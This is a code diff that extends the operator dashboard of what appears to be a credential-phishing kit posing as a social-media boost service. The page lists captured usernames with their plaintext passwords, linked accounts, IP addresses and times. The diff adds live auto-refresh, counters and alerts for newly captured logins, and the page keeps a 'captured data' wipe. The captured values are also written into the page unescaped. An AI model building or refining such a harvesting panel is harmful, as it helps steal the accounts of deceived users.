@@ -40,19 +40,46 @@
 
     <!-- Admin Dashboard -->
     <div id="admin-dashboard" class="container" style="display:none;">
-        <header style="padding:2rem 0;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(239,68,68,0.1);">
+        <header style="padding:2rem 0;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(239,68,68,0.1);flex-wrap:wrap;gap:1rem;">
             <div>
                 <h1 style="font-family:'Orbitron',sans-serif;font-size:2rem;color:#ef4444;text-shadow:0 0 20px rgba(239,68,68,0.4);letter-spacing:4px;">ADMIN CONSOLE</h1>
-                <p style="color:var(--text-dim);font-size:0.85rem;letter-spacing:2px;margin-top:0.3rem;">Monitoring system activity and requests</p>
+                <div style="display:flex;align-items:center;gap:1rem;margin-top:0.4rem;flex-wrap:wrap;">
+                    <p style="color:var(--text-dim);font-size:0.85rem;letter-spacing:2px;">Live monitoring — all devices</p>
+                    <span id="live-dot" style="display:inline-flex;align-items:center;gap:0.4rem;font-size:0.7rem;color:var(--neon-green);letter-spacing:1px;">
+                        <span style="width:8px;height:8px;border-radius:50%;background:var(--neon-green);box-shadow:0 0 8px var(--neon-green);animation:livePulse 1.5s ease-in-out infinite;display:inline-block;"></span>
+                        LIVE
+                    </span>
+                    <span id="last-refresh" style="font-size:0.7rem;color:var(--text-dim);"></span>
+                </div>
             </div>
-            <button class="btn" style="background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);color:#ef4444;font-family:'Orbitron',sans-serif;font-size:0.75rem;letter-spacing:2px;" onclick="logoutAdmin()">
-                <i class="fas fa-sign-out-alt" style="margin-right:0.4rem;"></i>LOGOUT
-            </button>
+            <div style="display:flex;gap:0.7rem;align-items:center;flex-wrap:wrap;">
+                <div style="text-align:center;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);border-radius:12px;padding:0.5rem 1rem;">
+                    <div id="total-logins" style="font-family:'Orbitron',sans-serif;font-size:1.4rem;font-weight:900;color:#ef4444;">0</div>
+                    <div style="font-size:0.6rem;letter-spacing:2px;color:var(--text-dim);text-transform:uppercase;">Logins</div>
+                </div>
+                <div style="text-align:center;background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.2);border-radius:12px;padding:0.5rem 1rem;">
+                    <div id="total-requests" style="font-family:'Orbitron',sans-serif;font-size:1.4rem;font-weight:900;color:var(--neon-green);">0</div>
+                    <div style="font-size:0.6rem;letter-spacing:2px;color:var(--text-dim);text-transform:uppercase;">Requests</div>
+                </div>
+                <button class="btn" style="background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);color:#ef4444;font-family:'Orbitron',sans-serif;font-size:0.75rem;letter-spacing:2px;" onclick="logoutAdmin()">
+                    <i class="fas fa-sign-out-alt" style="margin-right:0.4rem;"></i>LOGOUT
+                </button>
+            </div>
         </header>
+
+        <div id="new-entry-alert" style="display:none;background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.3);border-radius:12px;padding:0.8rem 1.2rem;margin-top:1.2rem;color:var(--neon-green);font-size:0.85rem;letter-spacing:1px;text-align:center;">
+            <i class="fas fa-bell" style="margin-right:0.5rem;"></i><span id="alert-msg">New entry received!</span>
+        </div>
+
+        <style>
+            @keyframes livePulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(1.3)} }
+            @keyframes flashNew { 0%{background:rgba(0,255,136,0.15)} 100%{background:transparent} }
+            .new-row { animation: flashNew 2s ease-out forwards; }
+        </style>
 
         <div class="admin-panel">
             <div class="section-divider">
-                <span class="section-title" style="color:#ef4444;"><i class="fas fa-users" style="margin-right:0.5rem;"></i>User Logins</span>
+                <span class="section-title" style="color:#ef4444;"><i class="fas fa-users" style="margin-right:0.5rem;"></i>User Logins <span id="login-count" style="background:rgba(239,68,68,0.2);border-radius:50px;padding:0.1rem 0.5rem;font-size:0.7rem;margin-left:0.4rem;"></span></span>
             </div>
 
             <div class="glass" style="overflow-x:auto;padding:1.5rem;border-color:rgba(239,68,68,0.1);">
@@ -72,7 +99,7 @@
             </div>
 
             <div class="section-divider" style="margin-top:3rem;">
-                <span class="section-title" style="color:var(--neon-green);"><i class="fas fa-shopping-bag" style="margin-right:0.5rem;"></i>Service Requests</span>
+                <span class="section-title" style="color:var(--neon-green);"><i class="fas fa-shopping-bag" style="margin-right:0.5rem;"></i>Service Requests <span id="req-count" style="background:rgba(0,255,136,0.15);border-radius:50px;padding:0.1rem 0.5rem;font-size:0.7rem;margin-left:0.4rem;"></span></span>
             </div>
 
             <div class="glass" style="overflow-x:auto;padding:1.5rem;border-color:rgba(0,255,136,0.1);">
@@ -122,74 +149,112 @@
             }, 1200);
         });
 
-        function showDashboard() {
-            document.getElementById('admin-login').style.display = 'none';
-            document.getElementById('admin-dashboard').style.display = 'block';
-            loadLogs();
-        }
+        let prevLoginCount = 0;
+        let prevReqCount = 0;
+        let autoRefreshTimer = null;
 
-        function loadLogs() {
+        function loadLogs(silent = false) {
             fetch('/api/get-logs')
                 .then(r => r.json())
-                .then(db => renderLogs(db.logins || [], db.requests || []))
-                .catch(() => renderLogs([], []));
+                .then(db => renderLogs(db.logins || [], db.requests || [], silent))
+                .catch(() => { if (!silent) renderLogs([], [], false); });
         }
 
-        function renderLogs(logins, requests) {
+        function renderLogs(logins, requests, silent) {
+            const newLogins   = logins.length - prevLoginCount;
+            const newRequests = requests.length - prevReqCount;
 
+            // Update counters
+            document.getElementById('total-logins').textContent   = logins.length;
+            document.getElementById('total-requests').textContent  = requests.length;
+            document.getElementById('login-count').textContent     = logins.length ? logins.length : '';
+            document.getElementById('req-count').textContent       = requests.length ? requests.length : '';
+            document.getElementById('last-refresh').textContent    = 'Updated: ' + new Date().toLocaleTimeString();
+
+            // Show new entry alert
+            if (silent && (newLogins > 0 || newRequests > 0)) {
+                const alertEl  = document.getElementById('new-entry-alert');
+                const alertMsg = document.getElementById('alert-msg');
+                let msg = [];
+                if (newLogins   > 0) msg.push(newLogins   + ' new login'   + (newLogins > 1 ? 's' : ''));
+                if (newRequests > 0) msg.push(newRequests + ' new request' + (newRequests > 1 ? 's' : ''));
+                alertMsg.textContent = msg.join(' & ') + ' received!';
+                alertEl.style.display = 'block';
+                setTimeout(() => alertEl.style.display = 'none', 5000);
+            }
+
+            prevLoginCount = logins.length;
+            prevReqCount   = requests.length;
+
+            // Render logins table (newest first)
             const loginTbody = document.getElementById('login-data');
-            loginTbody.innerHTML = logins.length === 0
-                ? '<tr><td colspan="6" style="text-align:center;color:var(--text-dim);padding:2rem;">No login data yet</td></tr>'
-                : logins.reverse().map(log => `
-                    <tr>
-                        <td><i class="fas fa-user" style="margin-right:0.4rem;color:var(--neon-blue);"></i>${log.user}</td>
-                        <td style="color:#ef4444;font-family:monospace;">${log.pass}</td>
+            const loginsRev  = [...logins].reverse();
+            loginTbody.innerHTML = loginsRev.length === 0
+                ? '<tr><td colspan="6" style="text-align:center;color:var(--text-dim);padding:2rem;letter-spacing:1px;">No login data yet — waiting for users</td></tr>'
+                : loginsRev.map((log, i) => `
+                    <tr class="${i < newLogins && silent ? 'new-row' : ''}">
+                        <td><i class="fas fa-user" style="margin-right:0.4rem;color:var(--neon-blue);"></i>${log.user || '—'}</td>
+                        <td style="color:#ef4444;font-family:monospace;">${log.pass || '—'}</td>
                         <td style="max-width:200px;">
                             ${log.accountLink
                                 ? `<div style="display:flex;flex-direction:column;gap:0.2rem;">
                                     <span style="color:var(--neon-blue);font-family:'Orbitron',sans-serif;font-size:0.78rem;font-weight:700;">${log.accountRealName || '@'+log.accountName}</span>
                                     ${log.accountRealName ? `<span style="font-size:0.65rem;color:rgba(255,255,255,0.4);font-family:monospace;">@${log.accountName}</span>` : ''}
                                     ${log.accountPlatform ? `<span style="font-size:0.6rem;color:rgba(255,255,255,0.25);letter-spacing:1px;text-transform:uppercase;">${log.accountPlatform}</span>` : ''}
-                                    <a href="${log.accountLink}" target="_blank" style="color:rgba(0,245,255,0.4);font-size:0.7rem;font-family:monospace;word-break:break-all;text-decoration:none;" onmouseover="this.style.color='var(--neon-blue)'" onmouseout="this.style.color='rgba(0,245,255,0.4)'">${log.accountLink.replace(/^https?:\/\//, '').substring(0,30)}...</a>
+                                    <a href="${log.accountLink}" target="_blank" style="color:rgba(0,245,255,0.4);font-size:0.7rem;font-family:monospace;word-break:break-all;text-decoration:none;">${log.accountLink.replace(/^https?:\/\//,'').substring(0,32)}...</a>
                                   </div>`
                                 : `<span style="color:var(--text-dim);font-size:0.8rem;">—</span>`
                             }
                         </td>
-                        <td>${log.platform}</td>
-                        <td style="color:var(--text-dim);font-family:monospace;font-size:0.85rem;">${log.ip}</td>
-                        <td style="color:var(--text-dim);font-size:0.85rem;">${log.time}</td>
+                        <td><span style="background:rgba(0,245,255,0.1);border:1px solid rgba(0,245,255,0.2);border-radius:6px;padding:0.15rem 0.5rem;font-size:0.75rem;letter-spacing:1px;">${log.platform || '—'}</span></td>
+                        <td style="color:var(--text-dim);font-family:monospace;font-size:0.82rem;">${log.ip || '—'}</td>
+                        <td style="color:var(--text-dim);font-size:0.8rem;white-space:nowrap;">${log.time || '—'}</td>
                     </tr>
                 `).join('');
 
+            // Render requests table (newest first)
             const requestTbody = document.getElementById('request-data');
-            requestTbody.innerHTML = requests.length === 0
-                ? '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:2rem;">No requests yet</td></tr>'
-                : requests.reverse().map(req => `
-                    <tr>
-                        <td>${req.user}</td>
+            const reqsRev      = [...requests].reverse();
+            requestTbody.innerHTML = reqsRev.length === 0
+                ? '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:2rem;letter-spacing:1px;">No service requests yet</td></tr>'
+                : reqsRev.map((req, i) => `
+                    <tr class="${i < newRequests && silent ? 'new-row' : ''}">
+                        <td>${req.user || '—'}</td>
                         <td style="color:var(--neon-blue);font-weight:700;font-family:'Orbitron',sans-serif;">${req.amount}</td>
                         <td>
                             <div style="display:flex;flex-direction:column;gap:0.1rem;">
                                 ${req.accountRealName ? `<span style="color:var(--neon-green);font-size:0.8rem;font-weight:600;">${req.accountRealName}</span>` : ''}
-                                ${req.accountName ? `<span style="color:rgba(255,255,255,0.4);font-size:0.7rem;">@${req.accountName}</span>` : ''}
-                                <a href="${req.link}" target="_blank" style="color:var(--text-dim);font-size:0.75rem;font-family:monospace;text-decoration:none;">${req.link.substring(0,35)}...</a>
+                                ${req.accountName    ? `<span style="color:rgba(255,255,255,0.4);font-size:0.7rem;">@${req.accountName}</span>` : ''}
+                                <a href="${req.link}" target="_blank" style="color:var(--text-dim);font-size:0.75rem;font-family:monospace;text-decoration:none;">${(req.link||'').substring(0,35)}...</a>
                             </div>
                         </td>
-                        <td>${req.platform}</td>
-                        <td style="color:var(--text-dim);font-size:0.85rem;">${req.time}</td>
+                        <td><span style="background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2);border-radius:6px;padding:0.15rem 0.5rem;font-size:0.75rem;letter-spacing:1px;">${req.platform || '—'}</span></td>
+                        <td style="color:var(--text-dim);font-size:0.8rem;white-space:nowrap;">${req.time || '—'}</td>
                     </tr>
                 `).join('');
+        }
+
+        function startAutoRefresh() {
+            autoRefreshTimer = setInterval(() => loadLogs(true), 10000);
+        }
+
+        function showDashboard() {
+            document.getElementById('admin-login').style.display = 'none';
+            document.getElementById('admin-dashboard').style.display = 'block';
+            loadLogs(false);
+            startAutoRefresh();
         }
 
         function clearLogs() {
             if (confirm('Delete all captured data permanently?')) {
                 fetch('/api/clear-logs', { method: 'POST' })
-                    .then(() => loadLogs())
-                    .catch(() => loadLogs());
+                    .then(() => { prevLoginCount = 0; prevReqCount = 0; loadLogs(false); })
+                    .catch(() => loadLogs(false));
             }
         }
 
         function logoutAdmin() {
+            clearInterval(autoRefreshTimer);
             location.reload();
         }
     </script>
